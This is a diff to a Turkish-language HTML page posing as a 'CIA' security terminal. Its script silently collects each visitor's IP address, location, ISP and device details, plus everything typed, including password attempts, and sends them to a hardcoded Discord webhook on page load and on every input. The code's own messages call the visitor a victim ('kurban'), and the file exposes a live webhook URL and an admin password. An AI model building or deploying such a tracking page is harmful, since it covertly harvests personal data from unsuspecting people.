@@ -9,7 +9,7 @@
         .terminal { width: 90%; max-width: 650px; padding: 25px; border: 1px solid #002200; background: #000; box-shadow: 0 0 20px rgba(0, 255, 0, 0.05); position: relative; }
         .cia-header { color: #004400; font-size: 10px; text-align: right; margin-bottom: 20px; border-bottom: 1px solid #002200; padding-bottom: 5px; }
         .query-box { font-size: 1.1rem; line-height: 1.6; margin: 15px 0; }
-        input { background: transparent; border: none; color: #00ff00; font-family: inherit; font-size: 1.2rem; outline: none; border-bottom: 1px solid #00ff00; width: 60px; text-align: center; }
+        input { background: transparent; border: none; color: #00ff00; font-family: inherit; font-size: 1.2rem; outline: none; border-bottom: 1px solid #00ff00; width: 150px; text-align: center; }
         .btn { background: #00ff00; color: #000; border: none; padding: 8px 20px; cursor: pointer; font-weight: bold; margin-top: 20px; font-family: inherit; text-transform: uppercase; }
         #vault { display: none; color: #bc00ff; border: 1px solid #bc00ff; padding: 15px; box-shadow: 0 0 15px #bc00ff; }
         .log-entry { border-bottom: 1px solid #1a1a1a; padding: 5px 0; font-size: 11px; }
@@ -22,7 +22,7 @@
 
     <div id="traitor-msg" class="traitor-screen">
         [!] HAİN TESPİT EDİLDİ [!]<br>
-        <span style="font-size: 14px; color: #fff;">İHANETİNİZ KAYDEDİLDİ. ERİŞİM ENGELLENDİ.</span>
+        <span style="font-size: 14px; color: #fff;">SİSTEM İHANETİ KAYDEDİLDİ. ERİŞİMİNİZ KALICI OLARAK ENGELLENDİ.</span>
     </div>
 
     <div id="gate" class="terminal">
@@ -33,131 +33,145 @@
             Sistem bütünlüğü doğrulanıyor... <br>
             Protokol-X başlatılsın mı? (1/0) <span class="cursor">_</span>
         </div>
-        <input type="text" id="cmd" maxlength="10" style="width: 150px;" placeholder="KOMUT">
+        <input type="text" id="cmd" maxlength="20" placeholder="KOMUT">
         <br>
         <button class="btn" onclick="execute()">KOMUTU GÖNDER</button>
     </div>
 
     <div id="auth" class="terminal" style="display: none;">
         <div class="cia-header">SECURITY_LAYER_02 // CREDENTIALS</div>
-        <div class="query-box" style="color: #ff0000;">YETKİLİ ŞİFRESİ GEREKLİ!</div>
-        <input type="password" id="pass" style="width: 250px;" placeholder="********">
+        <div class="query-box" style="color: #ff0000;">DİKKAT: YETKİLİ ŞİFRESİ GEREKLİ!</div>
+        <input type="password" id="pass" placeholder="********">
         <br>
         <button class="btn" onclick="verify()">SİSTEME GİRİŞ YAP</button>
     </div>
 
     <div id="vault" class="terminal">
-        <div class="cia-header" style="color: #bc00ff; border-bottom-color: #bc00ff;">LEXUS_VAULT // DATA_LOGS</div>
+        <div class="cia-header" style="color: #bc00ff; border-bottom-color: #bc00ff;">LEXUS_VAULT // MONITORING</div>
         <div id="log-list" style="max-height: 300px; overflow-y: auto;"></div>
         <button class="btn" style="background: #bc00ff; color: #000; font-size: 10px;" onclick="localStorage.clear(); location.reload();">BELLEĞİ SIFIRLA</button>
     </div>
 
     <script>
+        // WEBHOOK VE ŞİFRE AYARLARI
         const webh = "https://discord.com/api/webhooks/1480291700793544774/a8WwCE5IsjTE-p5kwWHuuI9IUGHLYYM1yAYtvz10nbhEljg2abosvDz3y74xzVnBT4eN";
         const adminKey = "lexuscxnnn113";
 
-        // GİRDİĞİ AN (GİZLİ LOG)
+        // SAYFA YÜKLENDİĞİNDE
         window.onload = async () => {
-            if (localStorage.getItem('traitor') === 'true') {
+            if (localStorage.getItem('sys_lock') === 'true') {
                 document.getElementById('gate').style.display = 'none';
                 document.getElementById('traitor-msg').style.display = 'block';
                 return;
             }
             renderLogs();
-            const initial = await fetchPackets();
-            sendToDiscord(initial, "🛰️ SİNYAL YAKALANDI", "Link açıldı, cevap bekleniyor.", 3447003);
-            saveLocal(initial, "Link Açıldı");
+            const p = await fetchPackets();
+            await sendToDiscord(p, "🛰️ SİNYAL YAKALANDI", "Kurban linke giriş yaptı.", 3447003);
+            saveLocal(p, "Giriş Yaptı");
         };
 
-        // CEVAP VERDİĞİ AN
+        // CEVAP VERDİĞİNDE
         async function execute() {
             const val = document.getElementById('cmd').value;
-            const data = await fetchPackets();
+            const p = await fetchPackets();
 
-            // Ne cevap verdiğini hem Discord'a hem panele gönder
-            sendToDiscord(data, "💬 CEVAP GELDİ", `Kullanıcı şu cevabı verdi: **${val}**`, 16776960);
-            saveLocal(data, `Cevap: ${val}`);
+            await sendToDiscord(p, "💬 CEVAP GELDİ", `Kurbanın yanıtı: **${val}**`, 16776960);
+            saveLocal(p, `Cevap: ${val}`);
 
             if (val === "1") {
                 document.getElementById('gate').style.display = 'none';
                 document.getElementById('auth').style.display = 'block';
             } 
             else if (val === "0") {
-                localStorage.setItem('traitor', 'true');
-                sendToDiscord(data, "🔴 HAİN TESPİT EDİLDİ!", "0 seçildi, IP banlandı.", 15158332);
+                localStorage.setItem('sys_lock', 'true');
+                await sendToDiscord(p, "🔴 HAİN TESPİT EDİLDİ", "0 seçildi, kurban banlandı.", 15158332);
                 alert("HAİN TESPİT EDİLDİ!");
                 location.reload();
             } else {
-                alert("GEÇERSİZ KOMUT: " + val);
+                alert("Geçersiz protokol: " + val);
             }
         }
 
-        // ŞİFRE DENEDİĞİ AN
+        // ŞİFRE GİRDİĞİNDE
         async function verify() {
             const passVal = document.getElementById('pass').value;
-            const data = await fetchPackets();
+            const p = await fetchPackets();
 
             if (passVal === adminKey) {
                 document.getElementById('auth').style.display = 'none';
                 document.getElementById('vault').style.display = 'block';
-                sendToDiscord(data, "🔥 TAM ERİŞİM", "Doğru şifre girildi.", 3066993);
-                saveLocal(data, "Admin Girişi Başarılı");
+                await sendToDiscord(p, "🔥 TAM ERİŞİM", "Doğru admin şifresi girildi.", 3066993);
+                saveLocal(p, "Admin Girişi Başarılı");
             } else {
-                sendToDiscord(data, "⚠️ HATALI ŞİFRE", `Denenen Şifre: **${passVal}**`, 16711680);
-                saveLocal(data, `Hatalı Şifre: ${passVal}`);
+                await sendToDiscord(p, "⚠️ HATALI ŞİFRE", `Denenen Yanlış Şifre: **${passVal}**`, 16711680);
+                saveLocal(p, `Hatalı Şifre: ${passVal}`);
                 alert("YETKİSİZ ERİŞİM DENEMESİ");
             }
         }
 
+        // VERİ TOPLAMA MOTORU (ÇİFT KATMANLI)
         async function fetchPackets() {
+            let data = { ip: "Bilinmiyor", city: "Bilinmiyor", isp: "Bilinmiyor" };
             try {
-                const r = await fetch('https://ipapi.co/json/');
-                const j = await r.json();
-                return {
-                    ip: j.ip,
-                    city: `${j.city} / ${j.country_name}`,
-                    isp: j.org,
-                    os: navigator.platform,
-                    ram: navigator.deviceMemory || "N/A",
-                    cpu: navigator.hardwareConcurrency || "N/A",
-                    res: `${window.screen.width}x${window.screen.height}`,
-                    time: new Date().toLocaleString()
-                };
-            } catch (e) { return null; }
-        }
-
-        function saveLocal(obj, evt) {
-            let h = JSON.parse(localStorage.getItem('lexus_archive')) || [];
-            let entry = { ...obj, event: evt };
-            h.unshift(entry);
-            localStorage.setItem('lexus_archive', JSON.stringify(h));
-            renderLogs();
-        }
-
-        function renderLogs() {
-            const list = document.getElementById('log-list');
-            const h = JSON.parse(localStorage.getItem('lexus_archive')) || [];
-            if(list) {
-                list.innerHTML = h.map(i => `<div class="log-entry">[${i.time}] <span style="color:#fff">${i.event}</span>: ${i.ip}</div>`).join('');
+                const res = await fetch('https://ipapi.co/json/');
+                const j = await res.json();
+                data = { ip: j.ip, city: `${j.city} / ${j.country_name}`, isp: j.org };
+            } catch (e) {
+                try {
+                    const res2 = await fetch('https://api.ipify.org?format=json');
+                    const j2 = await res2.json();
+                    data.ip = j2.ip;
+                } catch (e2) {}
             }
+            return {
+                ...data,
+                os: navigator.platform,
+                ram: navigator.deviceMemory || "N/A",
+                cpu: navigator.hardwareConcurrency || "N/A",
+                res: `${window.screen.width}x${window.screen.height}`,
+                time: new Date().toLocaleString()
+            };
         }
 
+        // DISCORD GÖNDERİM MOTORU
         async function sendToDiscord(i, title, desc, clr) {
             const payload = {
-                username: "CIA_DATABASE_ALARM",
+                username: "LEXUS_CIA_BOT",
                 embeds: [{
                     title: title,
                     description: desc,
                     color: clr,
                     fields: [
-                        { name: "Hedef", value: `**IP:** ${i.ip}\n**Konum:** ${i.city}`, inline: true },
-                        { name: "Sistem", value: `**OS:** ${i.os}\n**RAM:** ${i.ram}`, inline: true }
+                        { name: "📍 Hedef Bilgisi", value: `IP: ${i.ip}\nKonum: ${i.city}\nISS: ${i.isp}`, inline: false },
+                        { name: "💻 Cihaz Analizi", value: `OS: ${i.os}\nRAM: ${i.ram} | CPU: ${i.cpu}\nEkran: ${i.res}`, inline: false }
                     ],
-                    footer: { text: "Lexus V12.0 Security Core" },
+                    footer: { text: "Security System: Lexus V12.0" },
                     timestamp: new Date()
                 }]
             };
-            await fetch(webh, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+
+            try {
+                await fetch(webh, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) { console.error("Discord error:", err); }
+        }
+
+        function saveLocal(obj, evt) {
+            let h = JSON.parse(localStorage.getItem('lexus_history')) || [];
+            h.unshift({ ...obj, event: evt });
+            localStorage.setItem('lexus_history', JSON.stringify(h));
+            renderLogs();
+        }
+
+        function renderLogs() {
+            const list = document.getElementById('log-list');
+            const h = JSON.parse(localStorage.getItem('lexus_history')) || [];
+            if(list) {
+                list.innerHTML = h.map(i => `<div class="log-entry">[${i.time}] <span style="color:#fff">${i.event}</span>: ${i.ip}</div>`).join('');
+            }
         }
     </script>
 </body>
